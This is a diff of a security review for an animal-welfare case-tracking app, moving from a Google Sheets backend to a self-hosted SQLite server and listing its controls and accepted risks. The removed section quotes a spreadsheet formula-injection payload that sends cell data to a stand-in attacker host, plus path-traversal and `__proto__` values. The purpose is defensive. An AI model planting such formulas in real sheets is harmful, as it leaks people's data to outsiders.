@@ -1,160 +1,119 @@
-# Security Review — Animal Welfare V1
+# Security Review — Pawfile V1 (SQLite server)
 
-Reviewed 2026-10-26. Covers the Expo app, the Apps Script backend, the Sheets/Drive data store,
-and the backup/restore path.
+Reviewed 2026-11-04. Covers the Expo app, the self-hosted Node/SQLite server, the read-only
+dashboard, media storage, and the backup path.
 
-This document records **what was found, what was fixed, and what is accepted risk**. Anything in
-"Accepted risk" is a deliberate V1 limitation, not an oversight.
+This document records **what is protected, what is accepted risk, and what operators must do**.
+Anything under "Accepted risk" is a deliberate V1 limitation, not an oversight.
 
 ---
 
 ## Threat model in one paragraph
 
-The app has no user accounts. Everyone who has the deployed `/exec` URL and the shared secret can
-read and write every case, including complainant names and phone numbers. The backend is therefore
-protected by exactly one bearer credential, stored in Script Properties on the Google side and in
-the device keychain on the phone. The realistic attackers are:
+The app has no user accounts. Everyone who has the server URL and the shared secret can read and
+write every case, including complainant names and phone numbers, and can view every uploaded file.
+The server is therefore protected by exactly one bearer credential, stored in `server/.env` on the
+server and in the device keychain on the phone. The realistic attackers are:
 
 1. Someone who obtains the secret (screenshot, chat message, extracted app bundle, lost phone).
-2. Someone who can write data into the app (a rescuer entering a case) and then reads the shared
-   Google Sheet, which may be opened by an admin in a browser.
-3. A crafted backup or media file handed to a user.
+2. Someone who can write data into the app and then read it in the dashboard or the database file.
+3. A crafted media file or backup handed to a user.
+4. A network attacker if the server is exposed over plain HTTP.
 
 ---
 
-## Fixed in this review
+## Controls in place
 
-### 1. Spreadsheet formula injection (high)
+### Credential handling
 
-**Before:** every synced string was written straight into a cell with `setValues`. Google Sheets
-evaluates a cell starting with `=`, `+`, `-`, or `@` as a formula. A case description such as
-`=IMPORTXML("https://attacker.example/?d="&A1,"//x")` would run when an admin opened the Sheet and
-could export neighbouring cells to an external server. This is the classic CSV-injection class,
-and the shared Sheet is the whole point of the backend, so it was reachable by anyone who could
-file a case.
+- **No baked-in credentials.** `src/config/env.ts` has no default endpoint or secret. A fresh
+  install is local-only until someone enters a server URL and secret.
+- **Secret length:** at least 16 characters, enforced by both the app and the server.
+- **Constant-time comparison:** both sides SHA-256 the secret and use `timingSafeEqual`, so a
+  wrong guess does not leak the matching prefix length.
+- **No query-string secrets:** the app sends `x-api-secret`; the server also accepts a body
+  `secret` for compatibility. `?secret=` is never accepted.
+- **HTTPS required for public hosts:** the app allows plain HTTP only for localhost, `10.0.2.2`,
+  and private LAN ranges. Public hosts must use HTTPS.
+- **No URL credentials:** usernames, passwords, query strings, and fragments are rejected by the
+  app's endpoint validation.
+- **Secure storage:** the phone keeps the secret in SecureStore with
+  `WHEN_UNLOCKED_THIS_DEVICE_ONLY`; the web development fallback uses AsyncStorage and is not a
+  shipped target.
 
-**Now:** `writeCell_()` prefixes any value beginning with `= + - @`, tab, or carriage return with
-an apostrophe, which Sheets stores as literal text. `readCell_()` strips that apostrophe on the
-way back out, so the app sees exactly what the user typed and values round-trip unchanged.
-Numbers and booleans are written as native types and are unaffected.
+### Dashboard authentication
 
-### 2. Timing-unsafe secret comparison (medium)
+- Login exchanges the shared secret for a stateless session token:
+  `<expiry>.<HMAC(expiry)>`, signed with a key derived from the shared secret.
+- The token is stored in an **HttpOnly**, `SameSite=Lax` cookie, marked `Secure` in production.
+  Browser JavaScript never receives the master secret after login.
+- Dashboard APIs accept the session cookie only. They do not accept the master secret in a header
+  or query string.
+- Five failed logins per 15 minutes per IP are rejected with HTTP 429. This is an in-memory
+  limiter, appropriate for the single-instance model.
+- Dashboard JSON responses are `Cache-Control: no-store`.
+- The dashboard has no write routes. It cannot create, edit, or delete records.
 
-**Before:** `provided !== secret_()`. String comparison stops at the first differing character, so
-response time leaks how many leading characters a guess got right.
+### Sync API
 
-**Now:** `safeEqual_()` compares the full length of both strings without early exit. The secret is
-also required to be at least **16 characters**; a shorter one is rejected with a log entry rather
-than silently accepted.
+- The sync route **always returns HTTP 200** with `{ ok: false, error }` for auth failures, bad
+  JSON, unknown actions, and oversized bodies. This is deliberate: a proxy-generated 401/413
+  would leak less useful information and break the client contract. The route does not expose
+  stack traces.
+- Request bodies are capped at 40 MB; pushes are capped at 500 rows; ID blocks at 500.
+- **SQL injection:** all values are bound parameters. Column names come from `PRAGMA table_info`,
+  never from the request. Unknown keys are ignored.
+- **Boolean/type confusion:** JSON booleans are coerced to 0/1, finite numbers are preserved,
+  non-finite numbers become `NULL`, and nested objects are JSON-encoded. This also prevents
+  better-sqlite3 binding errors.
+- **Schema drift:** the server asserts the presence of all shared tables and the sync columns at
+  boot. It refuses to start on a mismatch instead of writing into a broken schema.
+- **Case ID allocation:** `server_state.nextCaseId` is updated inside a transaction. Offline
+  fallback IDs in the 900000–900999 band are excluded when seeding the counter, so one offline
+  device cannot push the shared counter forward by 900,000.
+- **Tombstones:** soft deletes are normal rows with `isDeleted = 1`; the server does not purge
+  them. Dashboard queries filter them out.
 
-### 3. Query-string secrets (medium)
+### Media
 
-**Before:** `doPost` accepted the secret from `e.parameter.secret`, i.e. from the URL query string.
-URLs are recorded in Google's request logs, proxies, and crash reports.
+- `uploadMedia` validates:
+  - `caseId` against `^[A-Za-z0-9_-]{1,32}$`
+  - category against `Photos`, `Evidence`, `Documents`
+  - MIME type against the same seven types the app can produce
+  - base64 charset
+  - decoded size ≤ 25 MB, checked from the base64 length before decoding
+- File names are stripped of control characters, path separators, and length beyond 120
+  characters. The stored path is built from the validated case ID, category, a UUID, and the
+  sanitized name.
+- The file route resolves the path from the `media_files` table, then asserts the result stays
+  under `UPLOADS_DIR`. A `../` value in the database is refused.
+- Files are served with the stored MIME type, `X-Content-Type-Options: nosniff`,
+  `Content-Disposition: inline`, and `Cache-Control: private, max-age=86400`. This prevents an
+  uploaded HTML/SVG file from executing as a same-origin document.
+- **Capability URLs:** `/api/files/:id?token=<HMAC(fileId)>` grants read access to that one file.
+  The token has no expiry because the URL is persisted in `documents.remoteUrl`. A leaked URL is
+  a leaked file; treat links and screenshots as sensitive.
 
-**Now:** only the JSON body is read. The app has always sent the secret in the body, so no client
-change was needed.
+### Dashboard data handling
 
-### 4. Unvalidated Drive uploads (high)
+- Every dashboard query filters `isDeleted = 0` for sync tables.
+- Device-local paths (`documents.localUri`) are never returned to the browser.
+- Stored `documents.remoteUrl` is not trusted or rendered; the dashboard mints a fresh signed URL
+  from `media_files`.
+- History `oldValue`, `newValue`, and `metadata` are truncated to 500 characters in API responses.
+- Dates are treated as IST wall-clock strings. The dashboard does not parse date-only values
+  through UTC, avoiding a one-day shift in hearings.
+- The SPA fallback returns `index.html` only for non-`/api` GETs; unknown `/api` paths return JSON
+  404. This avoids masking API mistakes as a blank dashboard.
 
-**Before:** `uploadMedia_` used `body.caseId`, `body.category`, `body.fileName`, and `body.mimeType`
-verbatim as Drive folder and file names, and base64-decoded an unbounded payload.
+### Operations
 
-**Now:**
-
-| Field | Rule |
-|---|---|
-| `caseId` | must match `^[A-Za-z0-9_-]{1,32}$` |
-| `category` | must be `Photos`, `Evidence`, or `Documents`; anything else falls back to `Documents` |
-| `fileName` | control characters and `/` `\` stripped, capped at 120 characters, extension preserved |
-| `mimeType` | must be one of the seven types the app can produce |
-| `base64` | must be base64 characters only, and decodes to at most 25 MB **checked before decoding** |
-
-Drive folder names can no longer be steered by case text, and a single request cannot allocate an
-arbitrary amount of memory.
-
-### 5. Duplicate case numbers from concurrent allocation (high, data integrity)
-
-**Before:** `allocateBlock_` read `nextCaseId`, computed a block, and wrote it back with no lock.
-Two devices asking at the same moment received the **same block**, minted the same case IDs, and
-silently overwrote each other's rows in `Cases`.
-
-**Now:** the whole read-modify-write runs inside `LockService.getScriptLock()`, and block sizes are
-clamped to 1–500.
-
-### 6. Prototype pollution in sheet lookups (medium)
-
-**Before:** `SHEETS[sheetName]`, `PRIMARY_KEYS[sheetName]`, and `rowByKey[key]` were plain object
-lookups. `SHEETS['__proto__']` and `SHEETS['constructor']` are truthy, and a row whose primary key
-was `__proto__` corrupted the lookup table.
-
-**Now:** lookups go through `has_()` / `headersFor_()` with `Object.prototype.hasOwnProperty`, and
-the row index uses `Object.create(null)`. Rows are also copied column-by-column into a
-null-prototype object, so an own `__proto__` key cannot reach the write path.
-
-### 7. Endpoint pinning on the device (high, credential phishing)
-
-**Before:** the Shared backend screen accepted any `https://` URL. The shared secret is a bearer
-credential, so a message saying "update your backend URL to this" would have mailed the secret and
-thereafter the full case history to a third party.
-
-**Now:** `validateBackendCredentials` requires `https:`, host exactly `script.google.com`, no
-embedded username/password, and a path ending in `/exec`. The secret must be at least 16
-characters, matching the server rule.
-
-### 8. Unbounded backup restore (medium)
-
-**Before:** `pickRestoreFile` called `unzipSync` on whatever the user chose and then trusted the
-JSON. A zip bomb could exhaust memory; a crafted backup could insert records with a `caseId` such
-as `../../settings`.
-
-**Now:**
-
-- The archive is limited to 64 MB compressed and 32 MB of `data.json`.
-- `unzipSync` uses a filter that **only decompresses `data.json`**, and only when its declared
-  uncompressed size is within budget, so other entries are never expanded.
-- Every record must be an object with a non-empty string id, no control characters, no `/` or `\`,
-  and at most 20 000 records per sheet.
-- The JSON path is size-checked before parsing.
-
-### 9. Case id used as a filesystem path (medium)
-
-**Before:** `attachDraftMedia` built `${documentDirectory}media/${caseId}/`. A case id can arrive
-from a synced sheet row or a restored backup, so `../../settings` would have written media outside
-the app's media folder.
-
-**Now:** the id is reduced to `[A-Za-z0-9_-]` and capped at 64 characters before it is used as a
-path segment.
-
-### 10. Phone numbers passed to `tel:` unfiltered (low)
-
-**Before:** `callPhone` passed the stored phone string straight into `tel:`. Free-text values could
-inject DTMF pauses/waits or extra URI components.
-
-**Now:** `sanitizeDialNumber` keeps an optional leading `+` and digits only, capped at 16
-characters, and skips the call when nothing dialable remains.
-
-### 11. Keychain backups carried the secret (low)
-
-**Before:** SecureStore used the default keychain accessibility class, so the shared secret could
-be included in an encrypted iCloud/iTunes backup and restored onto a different device.
-
-**Now:** entries are written with `WHEN_UNLOCKED_THIS_DEVICE_ONLY`. Android ignores the option and
-already binds entries to the device keystore.
-
-### 12. Error messages leaked configuration state (low)
-
-**Before:** `doPost` returned the raw exception text, and the auth path distinguished "secret not
-set" from "secret too short" from "wrong secret".
-
-**Now:** callers always receive `Unauthorized`, `Bad request`, or `Request failed`. The specific
-reason and stack trace go to the owner's Apps Script execution log only. Malformed JSON no longer
-produces a parser message, and requests over 40 MB are rejected before parsing.
-
-### 13. No limit on rows per push (low)
-
-**Now:** a single `push` is capped at 500 rows, so one request cannot rewrite an arbitrary share of
-a sheet while holding the script lock.
+- SQLite runs with WAL, `synchronous=NORMAL`, `foreign_keys=ON`, and a 5-second busy timeout.
+- `SIGTERM`/`SIGINT` close the HTTP server and then the database, so WAL checkpoints cleanly.
+- A daily `VACUUM INTO` snapshot is written to `data/backups/`; the newest seven are kept. Render
+  does not back up disks, so these snapshots are the server-side safety net.
+- The server refuses to start without `APP_SHARED_SECRET`, and the session/file HMAC keys are
+  derived from it.
 
 ---
 
@@ -162,56 +121,61 @@ a sheet while holding the script lock.
 
 | Risk | Why it is accepted | Mitigation available today |
 |---|---|---|
-| The shared secret is a single bearer credential — no per-user identity or access control | The product is a small trusted group of activists; accounts were explicitly out of scope | Rotate `APP_SHARED_SECRET` in Script Properties and on every device |
-| The secret ships in the app bundle and can be extracted from a rooted/decompiled build | Any client-side secret is extractable; the alternative is a real auth server | Keep the secret out of git, rotate on loss, restrict who installs builds |
-| The `/exec` endpoint is publicly reachable | Apps Script cannot present a Google login to a non-OAuth client | Security rests entirely on the secret plus the 16-character minimum |
-| The Sheet and Drive folder contain complainant PII in clear text | The Sheet is the human-readable audit trail the product needs | Keep both private; share only with named admins |
-| Anyone with the secret can read all cases | Same as the first row | Rotate the secret when someone leaves |
-| Network traffic is not certificate-pinned | `fetch` on Hermes uses the platform TLS stack and the endpoint is pinned to `script.google.com` | Platform trust store |
-| SQLite is unencrypted at rest | Device full-disk encryption is the platform baseline | OS-level device encryption and screen lock |
-| `localUri` (the device sandbox path of a photo) is synced in the `Documents` sheet | Low sensitivity — no credentials, and the file is not reachable from another device | None needed |
-| On web, the secret is kept in `AsyncStorage` (plain `localStorage`) instead of the keychain | Web is not a shipped target; the export exists for development | Do not connect a real backend from a web build |
-| No rate limiting beyond Google's quotas | Apps Script has no trustworthy per-caller identity to key a limiter on | Quotas, plus the 500-row and 25 MB request caps |
-| Drive files are uploaded as private but readable by the deploying account | Someone must be able to administer the files | Account security (2FA) on the deploying Google account |
+| One shared bearer secret — no per-user identity | Small trusted group; accounts were out of scope | Rotate `APP_SHARED_SECRET`, then update every client |
+| Anyone with the secret can read and write every case | Same as above | Keep the secret in a password manager; rotate on loss |
+| The secret can be extracted from a distributed build if placed in `EXPO_PUBLIC_API_SECRET` | Any client-side secret is extractable | Prefer entering it in Settings, not `.env.local` |
+| Dashboard compromise exposes all cases to a read-only view | The dashboard has no write access, but it does show PII | Strong secret, HTTPS, short session lifetime |
+| SQLite and uploads are unencrypted at rest | Disk encryption is the hosting platform's responsibility | Use a provider with encrypted volumes; restrict SSH/console access |
+| Media capability URLs do not expire | Stored URLs must keep working across devices and restarts | Treat links as sensitive; rotate the secret invalidates every token |
+| No rate limiting on `/api/sync` | The server cannot identify a caller beyond the secret | 40 MB body cap, 500-row push cap, 25 MB upload cap |
+| CORS defaults to `*` | The mobile app does not use CORS, and self-hosters may run the Expo web preview from another origin | Set `CORS_ORIGINS` to the exact dashboard origin in production |
+| Single instance, no horizontal scaling | SQLite is single-writer | Run one instance with a persistent disk |
+| No automatic off-site backups | Render disks are not backed up by the platform | Daily `VACUUM INTO` snapshots; copy them off the server |
+| History is append-only and client-authored | It is a deterrent, not a tamper-proof audit log | Restrict database access; keep the server private |
+| Dashboard session is valid for 12 hours | Balances convenience and exposure | Sign out; rotate the secret |
+| `/api/health` is unauthenticated | Render needs a health check | It only runs `SELECT 1` and returns no data |
+| Login rate limiter is in-memory | Single instance; restart clears it | The secret should be long and random; five attempts per 15 minutes still applies between restarts |
 
 ---
 
 ## Operational requirements
 
-These are not code changes, but the patches above assume them:
-
-1. **Redeploy `Code.gs`** as a **new version** (Deploy → Manage deployments → pencil → New
-   version). Existing deployments keep running the old code until you do.
-2. **Re-enter the secret** on every device if your current `APP_SHARED_SECRET` is shorter than 16
-   characters — it is now rejected.
-3. **Turn on 2-Step Verification** for the Google account that deploys the script. It can read
-   every case and every uploaded file.
-4. **Keep the Sheet and Drive folder private.** Share only with named admins.
-5. **Never commit `.env`.** It is gitignored; use `.env.local` for build-time defaults.
-6. **Never commit build output** (`dist/`, `dist-web/`). `EXPO_PUBLIC_*` values are inlined into
-   the bundle at build time, so a bundle built with `EXPO_PUBLIC_SHEETS_SECRET` contains the
-   secret in plain text. Both directories are gitignored.
+1. **Use a long random secret** (32+ bytes). Never use a dictionary phrase.
+2. **Serve over HTTPS** outside a trusted LAN. Render provides TLS automatically.
+3. **Keep `server/.env` private.** It is gitignored. Do not commit it.
+4. **Keep the persistent disk private.** It contains the database and every uploaded file.
+5. **Copy backups off the server.** The daily snapshots are on the same disk as the database, so
+   a lost disk loses both.
+6. **Run exactly one server instance** against a given SQLite file.
 7. **Rotate the secret** if a device is lost, a screenshot leaks, or someone leaves the group.
-8. **Prefer in-app setup over `EXPO_PUBLIC_SHEETS_SECRET`.** A runtime secret entered in
-   Settings → Shared backend lives only in the device keychain and never enters a build artifact.
+   Rotation invalidates dashboard sessions and every signed media URL.
+8. **Do not put a real secret in `EXPO_PUBLIC_API_SECRET`** for a build you distribute. Prefer
+   the in-app Settings screen, which stores it in the device keychain.
+9. **Review the dashboard URL before sharing it.** Anyone with the secret can sign in.
 
 ---
 
 ## What is still not defended against
 
-- A malicious member of the group who has the secret — they can alter or delete records. History
-  rows record who changed what by display name, which is a deterrent, not a control.
+- A malicious member of the group who has the secret. History records a display name, but that is
+  not an access control.
+- A compromised server, hosting account, or persistent disk.
+- A compromised phone with an unlocked screen.
 - Traffic analysis by the device's network operator.
-- A compromised Google account, or a compromised phone with an unlocked screen.
-- Supply-chain compromise of an npm dependency.
-- Denial of service by someone holding the secret (bounded by Google quotas and the request caps).
+- Supply-chain compromise of an npm dependency or the Render build environment.
+- Denial of service by someone holding the secret, bounded by the request size and row caps.
+- A stolen signed media URL. It grants read access to that one file until the secret is rotated.
 
 ---
 
 ## Verification performed
 
-- `npx tsc --noEmit` — clean.
-- `npx jest --runInBand` — 10 suites, 41 tests passing (added endpoint-pinning, secret-length, and
-  dial-sanitisation cases).
-- `node --check` on the Apps Script source — clean.
-- Manual review of the sync, upload, backup, and sharing paths.
+- `npm run typecheck` — clean.
+- `npm test` — 11 suites, 47 tests passing, including the new transport and credential tests.
+- `npm run server:test` — 20 integration tests passing: auth, boolean coercion, monotonic
+  versions, History idempotency, non-sync sheets, ID blocks, tombstones, pull overlap, media
+  tokens, path traversal, dashboard auth, soft-delete filtering, date handling, rate limiting.
+- `npm run dashboard:build` — dashboard typecheck and production build clean.
+- Manual end-to-end smoke test: push cases/actions/hearings/documents/history, upload and fetch
+  media, dashboard login, summary, case detail, SPA fallback, unauthorized dashboard access, and
+  JSON 404 for unknown API routes.
